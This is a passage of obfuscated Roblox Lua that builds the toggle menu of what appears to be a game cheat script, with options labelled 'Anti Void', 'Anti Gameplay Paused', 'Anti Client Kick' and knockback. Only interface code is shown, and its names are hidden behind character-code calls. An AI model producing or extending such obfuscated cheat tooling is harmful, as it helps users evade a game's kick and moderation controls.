_llza[_sc(49,51,98)][_sc(78,97,109,101)]=[[void]];
_llza[_sc(49,51,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,51,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,51,98)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,51,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,51,99)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,51,98)]);
_llza[_sc(49,51,99)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,51,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,51,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,51,99)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,51,99)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,51,99)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,51,99)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,51,99)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,51,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,51,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,51,99)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,51,100)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,51,99)]);
_llza[_sc(49,51,100)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,51,100)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,51,100)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,51,100)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,51,101)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,51,99)]);
_llza[_sc(49,51,101)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,51,101)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,51,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,51,101)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,51,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,51,102)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,51,101)]);
_llza[_sc(49,51,102)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,51,102)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,52,48)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,51,101)]);
_llza[_sc(49,52,48)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,52,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,52,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,52,48)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,52,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,52,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,52,49)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,52,48)]);
_llza[_sc(49,52,49)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,52,49)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,52,50)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,51,98)]);
_llza[_sc(49,52,50)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,52,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,52,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,52,50)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,52,50)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,52,50)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,52,50)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(49,52,50)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,52,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,52,50)][_sc(84,101,120,116)]=[[Anti Void]];
_llza[_sc(49,52,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,52,50)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,52,50)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,52,50)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,52,51)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,52,50)]);
_llza[_sc(49,52,51)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,52,52)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,52,50)]);
_llza[_sc(49,52,52)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,52,53)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,51,98)]);
_llza[_sc(49,52,53)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,52,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,51)]);
_llza[_sc(49,52,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,52,54)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(49,52,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,52,54)][_sc(78,97,109,101)]=[[gameplaypaused]];
_llza[_sc(49,52,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,52,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,52,54)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,52,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,52,55)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,52,54)]);
_llza[_sc(49,52,55)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,52,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,52,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,52,55)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,52,55)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,52,55)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,52,55)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,52,55)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,52,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,52,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,52,55)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,52,56)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,52,55)]);
_llza[_sc(49,52,56)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,52,56)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,52,56)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,52,56)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,52,57)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,52,55)]);
_llza[_sc(49,52,57)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,52,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,52,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,52,57)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,52,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,52,97)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,52,57)]);
_llza[_sc(49,52,97)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,52,97)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,52,98)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,52,57)]);
_llza[_sc(49,52,98)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,52,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,52,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,52,98)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,52,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,52,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,52,99)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,52,98)]);
_llza[_sc(49,52,99)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,52,99)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,52,100)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,52,54)]);
_llza[_sc(49,52,100)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,52,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,52,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,52,100)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,52,100)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,52,100)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,52,100)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(49,52,100)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,52,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,52,100)][_sc(84,101,120,116)]=[[Anti Gameplay Paused]];
_llza[_sc(49,52,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,52,100)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,52,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,52,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,52,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,52,100)]);
_llza[_sc(49,52,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,52,102)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,52,100)]);
_llza[_sc(49,52,102)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,53,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,52,54)]);
_llza[_sc(49,53,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,53,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,51)]);
_llza[_sc(49,53,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 10);
_llza[_sc(49,53,49)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=3;
_llza[_sc(49,53,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,53,49)][_sc(78,97,109,101)]=[[---DIVIDER---]];
_llza[_sc(49,53,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,53,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,53,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,53,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,53,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,53,49)]);
_llza[_sc(49,53,50)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,53,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,53,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,53,50)][_sc(78,97,109,101)]=[[dividerFrame]];
_llza[_sc(49,53,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,53,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,53,50)]);
_llza[_sc(49,53,51)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,53,51)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,53,52)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,53,50)]);
_llza[_sc(49,53,52)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,53,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,53,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,53,52)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(49,53,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,53,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,53,53)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,53,52)]);
_llza[_sc(49,53,53)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,53,53)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,53,54)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,53,50)]);
_llza[_sc(49,53,54)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,53,55)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(49,53,50)]);
_llza[_sc(49,53,56)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,53,49)]);
_llza[_sc(49,53,56)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,53,56)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,53,56)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 8);
_llza[_sc(49,53,56)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 8);
_llza[_sc(49,53,57)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,51)]);
_llza[_sc(49,53,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,53,57)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(49,53,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,53,57)][_sc(78,97,109,101)]=[[kick]];
_llza[_sc(49,53,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,53,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,53,57)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,53,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,53,97)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,53,57)]);
_llza[_sc(49,53,97)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,53,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,53,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,53,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,53,97)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,53,97)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,53,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,53,97)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,53,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,53,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,53,97)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,53,98)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,53,97)]);
_llza[_sc(49,53,98)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,53,98)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,53,98)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,53,98)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,53,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,53,97)]);
_llza[_sc(49,53,99)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,53,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,53,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,53,99)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,53,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,53,100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,53,99)]);
_llza[_sc(49,53,100)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,53,100)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,53,101)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,53,99)]);
_llza[_sc(49,53,101)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,53,101)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,53,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,53,101)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,53,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,53,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,53,102)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,53,101)]);
_llza[_sc(49,53,102)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,53,102)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,54,48)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,53,57)]);
_llza[_sc(49,54,48)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,54,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,54,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,54,48)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,54,48)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,54,48)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,54,48)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(49,54,48)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,54,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,54,48)][_sc(84,101,120,116)]=[[Anti Client Kick]];
_llza[_sc(49,54,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,54,48)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,54,48)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,54,48)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,54,49)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,54,48)]);
_llza[_sc(49,54,49)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,54,50)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,54,48)]);
_llza[_sc(49,54,50)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,54,51)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,53,57)]);
_llza[_sc(49,54,51)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,54,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,51)]);
_llza[_sc(49,54,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,54,52)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=5;
_llza[_sc(49,54,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,54,52)][_sc(78,97,109,101)]=[[knockback]];
_llza[_sc(49,54,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,54,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,54,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,54,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,54,53)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,54,52)]);
_llza[_sc(49,54,53)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,54,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,54,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,54,53)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,54,53)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,54,53)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,54,53)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,54,53)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,54,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,54,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,54,53)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,54,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,54,53)]);
_llza[_sc(49,54,54)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,54,54)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,54,54)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,54,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,54,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,54,53)]);
_llza[_sc(49,54,55)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,54,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,54,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,54,55)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,54,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,54,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,54,55)]);
_llza[_sc(49,54,56)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,54,56)][_sc(78,97,109,101)]=[[outlineStroke]];
